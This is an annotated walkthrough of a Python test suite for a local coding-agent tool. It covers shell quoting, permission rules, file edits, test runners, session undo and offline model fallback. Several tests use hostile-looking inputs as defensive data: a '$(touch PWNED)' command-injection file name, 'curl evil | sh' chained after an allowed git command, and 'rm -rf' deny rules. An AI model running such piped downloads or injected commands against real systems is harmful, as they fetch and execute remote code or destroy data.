 66 |         self.rfile.read(int(self.headers["Content-Length"]))
 67 |         self.answer(200, {"choices": [{"message": {"content": "local hello"}}],
 68 |                           "usage": {"prompt_tokens": 3, "completion_tokens": 2}})
 69 | 
 70 |     def log_message(self, *args):
 71 |         pass
 72 | 
 73 | HTTPServer(("127.0.0.1", port), Handler).serve_forever()
 74 | '''
 75 | 
 76 | 
```
- Imports the code under test (whole modules — `cli`, `localserver`, `runners` — where tests replace a function with a
  mock, and names otherwise). The runner function `test_kind` is called as `runners.test_kind`: imported by its name, a
  test tool such as pytest would mistake it for a test.
- `check_commit` is loaded **from its file** with `importlib`, because `tools/` is a folder of scripts, not a package.
- `FAKE_LLAMA` is a tiny stand-in for llama.cpp's server, saved to a file and started by the lifecycle test: it reads
  `--port` like the real one, answers `/health` with 503 ("loading") for its first 0.3 seconds and 200 after, and
  answers every chat request with "local hello".

```python
 77 | def box(tmp: str, settings: dict | None = None, **kw) -> ToolBox:
 78 |     """A ToolBox on a temp folder that approves everything (no formatting, so bytes are exact)."""
 79 |     return ToolBox(replace(Config(), workspace=Path(tmp), auto_format=False, **kw),
 80 |                    lambda _a: True, settings)
 81 | 
 82 | 
```
```python
 83 | def free_port() -> int:
 84 |     """A TCP port nothing listens on right now."""
 85 |     with socket.socket() as probe:
 86 |         probe.bind(("127.0.0.1", 0))
 87 |         return int(probe.getsockname()[1])
 88 | 
 89 | 
```
- `box` makes a toolbox on a temporary folder that approves everything, with automatic formatting off so the bytes on
  disk are exactly what the test expects. `free_port` asks the system for a port nothing listens on.

## Safety
```python
 90 | class SafetyTests(unittest.TestCase):
```
```python
 91 |     def test_file_names_are_quoted_for_the_shell(self):
 92 |         self.assertEqual(quote_for_shell("src/app.py"), "src/app.py")
 93 |         self.assertEqual(quote_for_shell("-rf.py"), "./-rf.py")
 94 |         quoted = quote_for_shell("a$(evil).py")
 95 |         self.assertNotEqual(quoted, "a$(evil).py")
 96 |         self.assertTrue(quoted.startswith("'") and quoted.endswith("'"))
 97 | 
```
```python
 98 |     def test_a_file_name_cannot_inject_a_command_into_a_hook(self):
 99 |         with tempfile.TemporaryDirectory() as tmp:
100 |             payload = ("a$(New-Item -ItemType File -Path PWNED).txt" if os.name == "nt"
101 |                        else "a$(touch PWNED).txt")
102 |             tools = box(tmp, {"hooks": {"after_edit": "echo checking {file}"}})
103 |             self.assertTrue(tools.call("write_file", {"path": payload, "content": "x"}).startswith("OK"))
104 |             self.assertFalse((Path(tmp) / "PWNED").exists())
105 | 
```
- Ordinary names are left alone, a leading `-` gets `./`, and a name with `$(...)` is wrapped in single quotes.
- **The injection, end to end:** a hook `echo checking {file}` and a file named `a$(New-Item ... PWNED).txt` (on Linux
  `a$(touch PWNED).txt`). The write succeeds and no `PWNED` file appears. Before the fix the same test created it.

```python
106 |     def test_timeout_stops_the_whole_process_tree(self):
107 |         code = ("import subprocess, sys, time; "
108 |                 "subprocess.Popen([sys.executable, '-c', 'import time; time.sleep(30)']); "
109 |                 "time.sleep(30)")
110 |         started = time.time()
111 |         exit_code, output = run_command([sys.executable, "-c", code], Path.cwd(), 2, 500)
112 |         self.assertEqual(exit_code, 124)
113 |         self.assertIn("timed out", output)
114 |         self.assertLess(time.time() - started, 15)          # not the child's 30 seconds
115 | 
```
```python
116 |     def test_programs_get_no_keyboard_input(self):
117 |         started = time.time()
118 |         exit_code, output = run_command([sys.executable, "-c", "input('name? ')"], Path.cwd(), 20, 2000)
119 |         self.assertNotEqual(exit_code, 0)
120 |         self.assertIn("EOFError", output)
121 |         self.assertLess(time.time() - started, 15)
122 | 
```
- A program that starts a 30-second child and sleeps is stopped by a 2-second timeout well within 15 seconds, with
  exit code 124 (before the fix: 25 seconds, waiting for the child).
- A program calling `input()` fails at once with `EOFError` instead of waiting for the keyboard.

```python
123 |     def test_binary_files_and_skipped_folders(self):
124 |         with tempfile.TemporaryDirectory() as tmp:
125 |             (Path(tmp) / "a.bin").write_bytes(b"MZ\x00\x01")
126 |             (Path(tmp) / "a.txt").write_text("hello", encoding="utf-8")
127 |             self.assertTrue(looks_binary(Path(tmp) / "a.bin"))
128 |             self.assertFalse(looks_binary(Path(tmp) / "a.txt"))
129 |         self.assertTrue(skip_dir("localagent.egg-info") and skip_dir("target") and skip_dir("dist"))
130 |         self.assertFalse(skip_dir("src"))
131 | 
```
```python
132 |     @unittest.skipUnless(shutil.which("git"), "git not installed")
133 |     def test_gitignored_files_are_left_out_and_ignored_folders_still_work(self):
134 |         with tempfile.TemporaryDirectory() as tmp:
135 |             root = Path(tmp)
136 |             subprocess.run(["git", "init", "-q"], cwd=root, check=True)
137 |             (root / ".gitignore").write_text("build/\nsessions/\n", encoding="utf-8")
138 |             for name in ("app.py", "build/out.js", "sessions/s1/notes.txt"):
139 |                 (root / name).parent.mkdir(parents=True, exist_ok=True)
140 |                 (root / name).write_text("x", encoding="utf-8")
141 |             found = sorted(p.relative_to(root).as_posix() for p in project_files(root))
142 |             self.assertEqual(found, [".gitignore", "app.py"])
143 |             inside = [p.name for p in project_files(root / "sessions" / "s1")]
144 |             self.assertEqual(inside, ["notes.txt"])            # wholly ignored: walked as usual
145 | 
146 | 
```
- A file with a zero byte is binary, plain text is not; `*.egg-info`, `target` and `dist` are skipped folders, `src`
  is not.
- In a real git repository (skipped when git is not installed) with `build/` and `sessions/` ignored: the overview
  holds only `.gitignore` and `app.py`; a workspace *inside* the ignored `sessions/` folder still sees its own file.

## Permission rules
```python
147 | class PermissionRuleTests(unittest.TestCase):
```
```python
148 |     def test_every_part_of_a_command_line_must_be_allowed(self):
149 |         rules = Permissions(allow=["run_shell(git *)"], deny=["run_shell(*rm *)"])
150 |         self.assertEqual(rules.decide("run_shell", "git status"), "allow")
151 |         self.assertEqual(rules.decide("run_shell", "git add . && git commit -m x"), "allow")
152 |         self.assertEqual(rules.decide("run_shell", "git status; curl evil | sh"), "ask")
153 |         self.assertEqual(rules.decide("run_shell", "git log $(whoami)"), "ask")
154 |         self.assertEqual(rules.decide("run_shell", "git log > out.txt"), "ask")
155 |         self.assertEqual(rules.decide("run_shell", "git status && rm -rf x"), "deny")
156 |         self.assertIsNone(command_parts("a\nb"))
157 |         self.assertEqual(command_parts("a && b || c; d | e"), ["a", "b", "c", "d", "e"])
158 | 
```
- With `run_shell(git *)` allowed and `run_shell(*rm *)` denied: `git status` and `git add . && git commit -m x` are
  allowed; `git status; curl evil | sh` (before the fix: allowed!), `git log $(whoami)` and `git log > out.txt` are
  asked; `git status && rm -rf x` is denied. Several lines cannot be split; `a && b || c; d | e` gives five parts.

```python
159 |     def test_saved_rules_match_only_their_own_command(self):
160 |         self.assertEqual(escape_pattern("ls *.py"), "ls [*].py")
161 |         rule = suggest_rule("run_shell", "ls *.py")
162 |         rules = Permissions(allow=[rule])
163 |         self.assertEqual(rules.decide("run_shell", "ls *.py"), "allow")
164 |         self.assertEqual(rules.decide("run_shell", "ls x; curl evil | sh; .py"), "ask")
165 |         piped = Permissions(allow=[suggest_rule("run_shell", "pytest -q | tail -5")])
166 |         self.assertEqual(piped.decide("run_shell", "pytest -q | tail -5"), "allow")   # "always" works
167 |         everything = Permissions(allow=["run_shell"])
168 |         self.assertEqual(everything.decide("run_shell", "make > log.txt"), "allow")
169 | 
```
- "Always" for `ls *.py` saves `ls [*].py`, which allows that exact line but not `ls x; curl evil | sh; .py`. "Always"
  for a piped line keeps working for that line. A bare `run_shell` rule allows everything, redirection included.

```python
170 |     def test_settings_env_and_test_command(self):
171 |         with tempfile.TemporaryDirectory() as tmp:
172 |             user = Path(tmp) / "user.json"
173 |             user.write_text(json.dumps({"env": {"LA_TEST_ONE": "user", "LA_TEST_TWO": "user"},
174 |                                         "test_command": "make test"}), encoding="utf-8")
175 |             project = Path(tmp) / ".localagent" / "settings.json"
176 |             project.parent.mkdir()
177 |             project.write_text(json.dumps({"env": {"LA_TEST_TWO": "project"}}), encoding="utf-8")
178 |             merged = load_settings(Path(tmp), user)
179 |             self.assertEqual(merged["test_command"], "make test")
180 |             with mock.patch.dict(os.environ, {"LA_TEST_ONE": "real"}):
181 |                 self.assertEqual(apply_env(merged), ["LA_TEST_TWO"])
182 |                 self.assertEqual((os.environ["LA_TEST_ONE"], os.environ["LA_TEST_TWO"]),
183 |                                  ("real", "project"))                   # a real variable wins
184 | 
185 | 
```
- User and project files merge `env` (the project wins) and `test_command`; `apply_env` sets only the variable that was
  not set already — a real variable wins.

## Faithful edits, search and reading
```python
186 | class FaithfulEditTests(unittest.TestCase):
```
```python
187 |     def test_line_endings_and_byte_order_mark_are_kept(self):
188 |         with tempfile.TemporaryDirectory() as tmp:
189 |             tools = box(tmp)
190 |             for name, raw in (("lf.txt", b"one\ntwo\n"), ("crlf.txt", b"one\r\ntwo\r\n"),
191 |                               ("bom.txt", b"\xef\xbb\xbfone\r\ntwo\r\n")):
192 |                 (Path(tmp) / name).write_bytes(raw)
193 |                 self.assertTrue(tools.call("edit_file", {"path": name, "old": "two",
194 |                                                          "new": "2"}).startswith("OK"))
195 |                 self.assertEqual((Path(tmp) / name).read_bytes(), raw.replace(b"two", b"2"))
196 |             (Path(tmp) / "new.cmd").unlink(missing_ok=True)
197 |             tools.call("write_file", {"path": "new.cmd", "content": "@echo off\necho hi\n"})
198 |             self.assertEqual((Path(tmp) / "new.cmd").read_bytes(), b"@echo off\r\necho hi\r\n")
199 | 
```
```python
200 |     def test_rejected_write_restores_the_exact_bytes(self):
201 |         with tempfile.TemporaryDirectory() as tmp:
202 |             original = b"x = 1\ny = 2\n"
203 |             (Path(tmp) / "m.py").write_bytes(original)
204 |             result = box(tmp).call("edit_file", {"path": "m.py", "old": "y = 2", "new": "y = ("})
205 |             self.assertTrue(result.startswith("REJECTED"))
206 |             self.assertEqual((Path(tmp) / "m.py").read_bytes(), original)
207 | 
```
- An LF file, a CRLF file and a CRLF file with a byte-order mark are each edited; the bytes on disk are exactly the old
  bytes with one word changed. A new `.cmd` file gets CRLF.
- A rejected edit of an LF Python file leaves its bytes untouched (before the fix it came back with CRLF).

```python
208 |     def test_python_with_a_byte_order_mark_or_an_old_encoding_is_valid_code(self):
209 |         with tempfile.TemporaryDirectory() as tmp:
210 |             root = Path(tmp)
211 |             (root / "bom.py").write_bytes(b"\xef\xbb\xbfprint('hi')\n")      # as PowerShell writes it
212 |             (root / "latin.py").write_bytes(b"# -*- coding: latin-1 -*-\nname = '\xe9'\n")
213 |             tools = box(tmp)
214 |             self.assertEqual(tools.check_workspace(), [])                  # Python runs both
215 |             self.assertTrue(tools.call("run_python", {"path": "bom.py"}).startswith("exit code 0"))
216 |             result = tools.call("edit_file", {"path": "bom.py", "old": "﻿print", "new": "print"})
217 |             self.assertTrue(result.startswith("OK"), result)                # naming the mark removes it
218 |             self.assertEqual((root / "bom.py").read_bytes(), b"print('hi')\n")
219 | 
```
- A Python file starting with a byte-order mark (as PowerShell writes it) and a latin-1 file with a coding line both
  pass the workspace check, the first one also runs; an edit whose `old` names the mark removes it. Added after the
  live offline test in which the mark was taken for a syntax error.

```python
220 |     def test_empty_old_text_is_refused(self):
221 |         with tempfile.TemporaryDirectory() as tmp:
222 |             (Path(tmp) / "n.md").write_text("abc", encoding="utf-8")
223 |             tools = box(tmp)
224 |             self.assertIn("must not be empty", tools.call(
225 |                 "edit_file", {"path": "n.md", "old": "", "new": "X", "all": True}))
226 |             self.assertIn("must not be empty", tools.call(
227 |                 "multi_edit", {"path": "n.md", "edits": [{"old": "", "new": "X"}]}))
228 |             self.assertEqual((Path(tmp) / "n.md").read_text(encoding="utf-8"), "abc")
229 | 
```
- `edit_file` with an empty `old` and `all=true`, and `multi_edit` with an empty `old`, are both refused; the file still
  says `abc` (before the fix: `XaXbXcX`).

```python
230 |     def test_search_covers_every_text_file(self):
231 |         with tempfile.TemporaryDirectory() as tmp:
232 |             root = Path(tmp)
233 |             (root / "src").mkdir()
234 |             (root / "src" / "a.ts").write_text("const needle = 1;\n", encoding="utf-8")
235 |             (root / "b.js").write_text("needle()\n", encoding="utf-8")
236 |             (root / "c.py").write_text("needle = 3\n", encoding="utf-8")
237 |             (root / "blob.bin").write_bytes(b"needle\x00")
238 |             tools = box(tmp)
239 |             everything = tools.call("search", {"pattern": "needle"})
240 |             self.assertTrue(all(n in everything for n in ("src/a.ts:1", "b.js:1", "c.py:1")))
241 |             self.assertNotIn("blob.bin", everything)
242 |             both = tools.call("search", {"pattern": "needle", "glob": "*.{js,ts}"})
243 |             self.assertTrue("a.ts" in both and "b.js" in both and "c.py" not in both)
244 |             self.assertEqual(tools.call("search", {"pattern": "needle", "glob": "src/*"}),
245 |                              "src/a.ts:1: const needle = 1;")
246 |             self.assertIn("c.py:1", tools.call("search", {"pattern": "needle", "path": "c.py"}))
247 | 
```
- A search without a glob finds `.ts`, `.js` and `.py` files but not the binary one; `*.{js,ts}` finds exactly the two;
  `src/*` matches by path; and `path` may name one file.

```python
248 |     def test_read_file_refuses_binary_and_says_how_much_is_left(self):
249 |         with tempfile.TemporaryDirectory() as tmp:
250 |             (Path(tmp) / "model.bin").write_bytes(b"\x00\x01" * 100)
251 |             (Path(tmp) / "t.txt").write_text("\n".join(f"line {i}" for i in range(1, 11)),
252 |                                              encoding="utf-8")
253 |             tools = box(tmp)
254 |             self.assertIn("binary file", tools.call("read_file", {"path": "model.bin"}))
255 |             part = tools.call("read_file", {"path": "t.txt", "start": 2, "end": 3})
256 |             self.assertEqual(part, "2: line 2\n3: line 3\n(lines 2-3 of 10)")
257 |             self.assertEqual(tools.call("read_file", {"path": "t.txt", "start": 50}),
258 |                              "(the file has only 10 lines)")
259 |             with mock.patch("localagent.tools.MAX_READ_BYTES", 10):
260 |                 self.assertIn("too big", tools.call("read_file", {"path": "t.txt"}))
261 |                 self.assertEqual(tools.call("read_file", {"path": "t.txt", "start": 9, "end": 9}),
262 |                                  "9: line 9")
263 | 
264 | 
```
- A binary file is refused. Reading lines 2-3 of a 10-line file ends with `(lines 2-3 of 10)`; starting at line 50 says
  the file has only 10 lines. With the size limit lowered to 10 bytes (a mock), a whole read is refused but a range is
  read line by line.

## Language checks
```python
265 | class LanguageCheckTests(unittest.TestCase):
```
```python
266 |     def check(self, name: str, text: str) -> bool:
267 |         with tempfile.TemporaryDirectory() as tmp:
268 |             path = Path(tmp) / name
269 |             path.write_text(text, encoding="utf-8")
270 |             return verify_file(path, Path(tmp)).ok
271 | 
```
```python
272 |     def test_json_with_comments_where_the_format_allows_them(self):
273 |         jsonc = '{\n  // options\n  "a": {"b": [1, 2,], /* note */ "c": "x // y, }",},\n}\n'
274 |         self.assertTrue(self.check("tsconfig.json", jsonc))
275 |         self.assertTrue(self.check("settings.jsonc", jsonc))
276 |         self.assertFalse(self.check("package.json", jsonc))         # npm would reject it too
277 |         self.assertTrue(self.check("data.json", '﻿{"a": 1}'))  # a byte-order mark is fine
278 |         self.assertEqual(json.loads(strip_jsonc('{"u": "http://x//y", "c": "a, }",}')),
279 |                          {"u": "http://x//y", "c": "a, }"})
280 | 
```
- One JSONC text (comments, trailing commas, and a string containing `//` and `, }`) passes as `tsconfig.json` and as
  `settings.jsonc` but fails as `package.json`; a JSON file with a byte-order mark passes; `strip_jsonc` keeps strings
  intact.

```python
281 |     @unittest.skipUnless(shutil.which("gcc") and shutil.which("g++"), "gcc/g++ not installed")
282 |     def test_header_files_may_be_c_or_cpp(self):
283 |         self.assertTrue(self.check("shape.h", "namespace g { class S { public: int x; }; }\n"))
284 |         self.assertTrue(self.check("point.h", "struct point { int x, y; };\n"))
285 |         self.assertFalse(self.check("broken.h", "class X { int y }\n"))
286 | 
```
```python
287 |     @unittest.skipUnless(shutil.which("rustfmt"), "rustfmt not installed")
288 |     def test_rust_files_may_name_modules_not_written_yet(self):
289 |         self.assertTrue(self.check("main.rs", "mod util;\nfn main() { util::hi(); }\n"))
290 |         self.assertFalse(self.check("bad.rs", "mod util;\nfn main() { let x = ; }\n"))
291 | 
292 | 
```
- A C++ header and a C header named `.h` both pass, a broken one fails (needs gcc and g++).
- `main.rs` declaring a module that does not exist yet passes; a syntax error still fails (needs rustfmt).

## Running tests the project's way
```python
293 | class TestRunnerTests(unittest.TestCase):
```
```python
294 |     def test_the_right_test_tool_is_chosen(self):
295 |         with tempfile.TemporaryDirectory() as tmp:
296 |             root = Path(tmp)
297 |             self.assertEqual(runners.test_kind(root), "python")
298 |             (root / "package.json").write_text('{"scripts": {"test": "jest"}}', encoding="utf-8")
299 |             self.assertEqual(runners.test_kind(root), "npm")
300 |             (root / "package.json").write_text(
301 |                 '{"scripts": {"test": "echo \\"Error: no test specified\\" && exit 1"}}',
302 |                 encoding="utf-8")
303 |             self.assertEqual(runners.test_kind(root), "python")     # npm's placeholder
304 |             (root / "go.mod").write_text("module x\n", encoding="utf-8")
305 |             self.assertEqual(runners.test_kind(root), "go")
306 |             (root / "tests").mkdir()
307 |             (root / "tests" / "test_a.py").write_text("", encoding="utf-8")
308 |             self.assertEqual(runners.test_kind(root), "python")     # Python tests win
309 |             self.assertEqual(runners._unittest_start(root), "-s tests")
310 | 
```
- An empty folder → `python`; a `package.json` with a real test script → `npm`; npm's placeholder script → `python`;
  a `go.mod` → `go`; Python tests in a plain `tests` folder → `python` again (they win), started with `-s tests`.

```python
311 |     def test_tests_in_a_plain_tests_folder_are_found(self):
312 |         with tempfile.TemporaryDirectory() as tmp:
313 |             (Path(tmp) / "tests").mkdir()
314 |             (Path(tmp) / "tests" / "test_a.py").write_text(
315 |                 "import unittest\nclass T(unittest.TestCase):\n    def test_x(self):\n"
316 |                 "        self.assertTrue(True)\n", encoding="utf-8")
317 |             result = box(tmp).call("run_tests", {})
318 |             self.assertTrue(result.startswith("exit code 0"), result)
319 |             self.assertTrue("Ran 1 test" in result or "1 passed" in result, result)
320 | 
```
```python
321 |     def test_your_own_test_command_from_the_settings(self):
322 |         with tempfile.TemporaryDirectory() as tmp:
323 |             result = box(tmp, {"test_command": "echo custom-tests-ran"}).call("run_tests", {})
324 |             self.assertIn("custom-tests-ran", result)
325 | 
```
```python
326 |     def test_the_project_virtual_environment_is_used(self):
327 |         with tempfile.TemporaryDirectory() as tmp:
328 |             self.assertEqual(runners.project_python(Path(tmp)), sys.executable)
329 |             inside = "Scripts/python.exe" if os.name == "nt" else "bin/python"
330 |             fake = Path(tmp) / ".venv" / inside
331 |             fake.parent.mkdir(parents=True)
332 |             fake.write_text("", encoding="utf-8")
333 |             self.assertEqual(runners.project_python(Path(tmp)), str(fake))
334 | 
335 | 
```
- A test in `tests/` without `__init__.py` really runs (`Ran 1 test`, or `1 passed` where pytest is installed) — before
  the fix: `Ran 0 tests`, exit code 5.
- A `test_command` from the settings is what runs.
- Without a project environment the agent's Python is used; with a `.venv` holding a Python, that one is.

## History, empty answers, cut-off answers, switching
```python
336 | class HistoryTests(unittest.TestCase):
```
```python
337 |     def history(self) -> list[dict]:
338 |         big_call = {"id": "c1", "function": {"name": "write_file",
339 |                                              "arguments": {"path": "a.py", "content": "x" * 5000}},
340 |                     "extra_content": {"google": {"thought_signature": "S"}}}
341 |         return [{"role": "system", "content": "sys"},
342 |                 {"role": "user", "content": "first request"},
343 |                 {"role": "assistant", "content": "", "tool_calls": [big_call]},
344 |                 {"role": "tool", "tool_call_id": "c1", "content": "y" * 3000},
345 |                 {"role": "assistant", "content": "done"},
346 |                 {"role": "user", "content": "second"},
347 |                 {"role": "assistant", "content": "ok"},
348 |                 {"role": "user", "content": "third"},
349 |                 {"role": "assistant", "content": "fine"}]
350 | 
```
- A small conversation whose first tool call writes 5 000 characters (with a thought signature) and whose tool result
  has 3 000.

```python
351 |     def test_tool_call_arguments_count_and_are_shortened_last(self):
352 |         history = self.history()
353 |         self.assertGreater(message_size(history[2]), 5000)
354 |         fitted = fit_history(history, 6000)
355 |         self.assertEqual(fitted[3]["content"], REMOVED)                  # 1. output blanked
356 |         self.assertEqual(fitted[2]["tool_calls"][0]["function"]["arguments"]["content"], "x" * 5000)
357 |         shorter = fit_history(history, 1000)                             # 2. arguments shortened
358 |         call = shorter[2]["tool_calls"][0]
359 |         self.assertEqual(call["function"]["arguments"], {"path": "a.py", "content": SHORTENED})
360 |         self.assertNotIn("extra_content", call)
361 |         self.assertEqual(history[3]["content"], "y" * 3000)             # the original is untouched
362 | 
```
```python
363 |     def test_oldest_exchanges_are_dropped_only_as_a_last_resort(self):
364 |         history = self.history()
365 |         history[1] = {"role": "user", "content": "z" * 9000}
366 |         fitted = fit_history(history, 2000)
367 |         self.assertEqual(fitted[0]["content"], "sys")
368 |         self.assertEqual(fitted[1], {"role": "user", "content": "second"})   # starts with a request
369 |         self.assertEqual(fitted[-4:], history[-4:])
370 | 
```
- The call's size includes its arguments. A budget of 6 000 blanks the old output but keeps the arguments; a budget
  of 1 000 also shortens them (keeping `path`, dropping the signature). The original list is never changed.
- When even that cannot fit (a 9 000-character first request), the oldest exchange is dropped: the result starts with
  the system prompt and the next user message, and the last four messages are unchanged.

```python
371 |     def make(self, tmp, script, **kw):
372 |         cfg = replace(Config(), workspace=Path(tmp), auto_format=False, **kw)
373 |         return Agent(cfg, FakeBackend(script), ToolBox(cfg, lambda _q: True), Meter())
374 | 
```
```python
375 |     def test_the_agent_measures_arguments_too(self):
376 |         with tempfile.TemporaryDirectory() as tmp:
377 |             agent = self.make(tmp, [])
378 |             before = agent._size()
379 |             agent.messages.append(self.history()[2])
380 |             self.assertGreater(agent._size() - before, 5000)
381 | 
```
```python
382 |     def test_an_empty_answer_is_retried_once(self):
383 |         with tempfile.TemporaryDirectory() as tmp:
384 |             empty = {"role": "assistant", "content": ""}
385 |             agent = self.make(tmp, [empty, {"role": "assistant", "content": "4"}])
386 |             self.assertEqual(agent.run("what is 2+2?"), "4")
387 |             self.assertIn(EMPTY_REPLY, [m["content"] for m in agent.messages])
388 |             self.assertNotIn("", [m["content"] for m in agent.messages if m["role"] == "assistant"
389 |                                   and not m.get("tool_calls")])
390 |             twice = self.make(tmp, [empty, empty])
391 |             self.assertEqual(twice.run("hello?"), EMPTY_TWICE)
392 | 
```
- `make` builds an agent with a scripted model. Adding the big call grows the agent's measured size by more than 5 000.
- An empty answer followed by "4" returns "4", with the reminder in the history and no empty assistant message left
  in it; two empty answers return `EMPTY_TWICE`.

```python
393 |     def test_cut_off_arguments_are_explained_and_a_cut_off_answer_is_kept(self):
394 |         with tempfile.TemporaryDirectory() as tmp:
395 |             broken = {"role": "assistant", "content": "", "tool_calls": [
396 |                 {"function": {"name": "write_file", "arguments": '{"path": "a.py", "content": "pri'}}]}
397 |             cut = {"role": "assistant", "content": "", "tool_calls": [
398 |                 {"function": {"name": "finish", "arguments": '{"summary": "The answer is 42 bec'}}]}
399 |             agent = self.make(tmp, [broken, cut])
400 |             answer = agent.run("explain")
401 |             self.assertIn(BAD_ARGUMENTS, [m["content"] for m in agent.messages if m["role"] == "tool"])
402 |             self.assertEqual(answer, "The answer is 42 bec [answer cut off]")
403 | 
```
```python
404 |     def test_polite_requests_still_count_as_changes(self):
405 |         for text in ("Please fix the bug", "can you add a test?", "Go ahead and create it",
406 |                      "I want you to rename x"):
407 |             self.assertTrue(_wants_change(text), text)
408 |         for text in ("Can you explain this?", "why is it slow", "please"):
409 |             self.assertFalse(_wants_change(text), text)
410 | 
```
```python
411 |     def test_switching_models_keeps_the_conversation(self):
412 |         with tempfile.TemporaryDirectory() as tmp:
413 |             agent = self.make(tmp, [{"role": "assistant", "content": "online answer"}])
414 |             agent.run("first")
415 |             local = FakeBackend([{"role": "assistant", "content": "offline answer"}])
416 |             agent.set_backend(local, replace(Config(), backend="local", num_ctx=8192))
417 |             self.assertIs(agent.backend, local)
418 |             self.assertEqual(agent.run("second"), "offline answer")
419 |             self.assertIn("first", [m["content"] for m in agent.messages])
420 | 
421 | 
```
- A `write_file` with cut-off arguments gets `BAD_ARGUMENTS`; a cut-off `finish` returns
  `The answer is 42 bec [answer cut off]`.
- "Please fix", "can you add", "Go ahead and create", "I want you to rename" want changes; "Can you explain", "why is
  it slow" and "please" alone do not.
- After `set_backend` the new model answers, `agent.backend` is it, and the first request is still in the history.

## Sessions and `/undo`
```python
422 | class SessionAndUndoTests(unittest.TestCase):
```
```python
423 |     def test_resume_skips_what_reset_or_compact_left_behind(self):
424 |         with tempfile.TemporaryDirectory() as tmp:
425 |             log = SessionLog(Path(tmp))
426 |             log.append({"role": "user", "content": "secret topic"})
427 |             log.mark("reset")
428 |             log.append({"role": "user", "content": "new topic"})
429 |             with log.path.open("a", encoding="utf-8") as handle:
430 |                 handle.write('{"role": "user", "cont')               # a crash mid-write
431 |             self.assertEqual(load_session(log.path), [{"role": "user", "content": "new topic"}])
432 |             self.assertIn("secret topic", session_title(log.path))  # titled by its first request
433 | 
```
```python
434 |     def test_agent_marks_reset_and_compaction_in_the_log(self):
435 |         with tempfile.TemporaryDirectory() as tmp:
436 |             cfg = replace(Config(), workspace=Path(tmp))
437 |             log = SessionLog(Path(tmp) / "s")
438 |             agent = Agent(cfg, FakeBackend([{"role": "assistant", "content": "a"}] * 3
439 |                                            + [{"role": "assistant", "content": "SUMMARY"}]),
440 |                           ToolBox(cfg), Meter(), log)
441 |             agent.run("one")
442 |             agent.reset()
443 |             agent.run("two")
444 |             agent.run("three")
445 |             agent.compact()
446 |             restored = load_session(log.path)
447 |             self.assertIn("SUMMARY", restored[0]["content"])
448 |             self.assertFalse(any("one" == m.get("content") for m in restored))
449 | 
```
- A log with "secret topic", a reset, "new topic" and a half-written line resumes with only "new topic"; its title
  still shows the first request.
- An agent that answered, was reset, answered twice and compacted resumes with the summary first, and the request from
  before the reset is gone.

```python
450 |     def test_undo_skips_quiet_requests_and_keeps_your_own_edits(self):
451 |         with tempfile.TemporaryDirectory() as tmp:
452 |             root = Path(tmp)
453 |             (root / "a.txt").write_text("v1", encoding="utf-8")
454 |             (root / "b.txt").write_text("b1", encoding="utf-8")
455 |             points = Checkpoints(root)
456 |             points.take("change a and b")
457 |             (root / "a.txt").write_text("v2", encoding="utf-8")
458 |             (root / "b.txt").write_text("b2", encoding="utf-8")
459 |             (root / "c.txt").write_text("new", encoding="utf-8")
460 |             points.commit()
461 |             points.take("just a question")
462 |             points.commit()                                         # changed nothing: no step
463 |             time.sleep(0.05)
464 |             (root / "b.txt").write_text("my own edit", encoding="utf-8")
465 |             message = points.undo()
466 |             self.assertEqual((root / "a.txt").read_text(encoding="utf-8"), "v1")
467 |             self.assertEqual((root / "b.txt").read_text(encoding="utf-8"), "my own edit")
468 |             self.assertFalse((root / "c.txt").exists())
469 |             self.assertIn('restored 1 file(s), removed 1 new file(s) (from "change a and b")', message)
470 |             self.assertIn("left 1 file(s) alone", message)
471 |             self.assertEqual(points.undo(), "nothing to undo")
472 | 
```
```python
473 |     def test_a_same_size_edit_in_the_same_clock_tick_is_still_seen(self):
474 |         with tempfile.TemporaryDirectory() as tmp:
475 |             path = Path(tmp) / "keep.txt"
476 |             path.write_text("v1", encoding="utf-8")
477 |             stamp = path.stat().st_mtime_ns
478 |             points = Checkpoints(Path(tmp))
479 |             points.take()
480 |             path.write_text("v2", encoding="utf-8")              # same size ...
481 |             os.utime(path, ns=(stamp, stamp))                    # ... and the same coarse time stamp
482 |             self.assertIn("restored 1", points.undo())          # seen anyway (it was "racy")
483 |             self.assertEqual(path.read_text(encoding="utf-8"), "v1")
484 | 
```
```python
485 |     def test_snapshots_store_each_content_once(self):
486 |         with tempfile.TemporaryDirectory() as tmp:
487 |             for i in range(5):
488 |                 (Path(tmp) / f"f{i}.txt").write_text("same content", encoding="utf-8")
489 |             points = Checkpoints(Path(tmp))
490 |             for _ in range(3):
491 |                 points.take()
492 |                 points.commit()
493 |             self.assertEqual(len(points._blobs), 1)
494 | 
495 | 
```
- A request changes `a.txt` and `b.txt` and creates `c.txt`; a question changes nothing; then *you* edit `b.txt`. `/undo`
  restores `a.txt`, removes `c.txt`, leaves your `b.txt` alone and says so, naming the request; the question was never
  an undo step. A second `/undo` has nothing to do.
- A same-size edit given the file's old time stamp (`os.utime`, imitating Windows' coarse clock) is still noticed
  and undone. With `RACY_NS` set to 0 the test fails — it reproduces the bug CI found on Windows.
- Five files with the same content, snapshotted three times, are stored once.

## Offline detection
```python
496 | class OfflineTests(unittest.TestCase):
```
```python
497 |     def chain(self, hosted, local=None, probe=None, clock=None):
498 |         notices: list[str] = []
499 |         entries = [Entry("gemini-x", hosted, RateLimiter("gemini-x", 100, 10**6, 100))]
500 |         if local is not None:
501 |             entries.append(Entry("local", local))
502 |         backend = FallbackBackend(entries, 3, sleep=lambda _s: None, on_notice=notices.append,
503 |                                   probe=probe, clock=clock or time.monotonic)
504 |         return backend, notices
505 | 
```
- A chain of one rate-limited ("hosted") model and optionally a local one, with an injectable probe and clock.

```python
506 |     def test_no_internet_goes_straight_to_the_local_model_and_back(self):
507 |         now = [1000.0]
508 |         hosted = ScriptedBackend([LLMError("no name", dns=True), reply("online again")])
509 |         local = ScriptedBackend([reply("local 1"), reply("local 2"), reply("local 3")])
510 |         up = [False]
511 |         backend, notices = self.chain(hosted, local, probe=lambda: up[0], clock=lambda: now[0])
512 |         self.assertEqual(backend.chat([], []).message["content"], "local 1")
513 |         self.assertEqual(hosted.calls, 1)                           # a name failure: no retries
514 |         self.assertTrue(backend.offline and any("unreachable" in n for n in notices))
515 |         self.assertEqual(backend.chat([], []).message["content"], "local 2")
516 |         self.assertEqual(hosted.calls, 1)                           # skipped while offline
517 |         now[0] += 120                                               # cool-down over, still down
518 |         self.assertEqual(backend.chat([], []).message["content"], "local 3")
519 |         self.assertEqual(hosted.calls, 1)
520 |         now[0] += 120
521 |         up[0] = True                                                # the internet is back
522 |         self.assertEqual(backend.chat([], []).message["content"], "online again")
523 |         self.assertFalse(backend.offline)
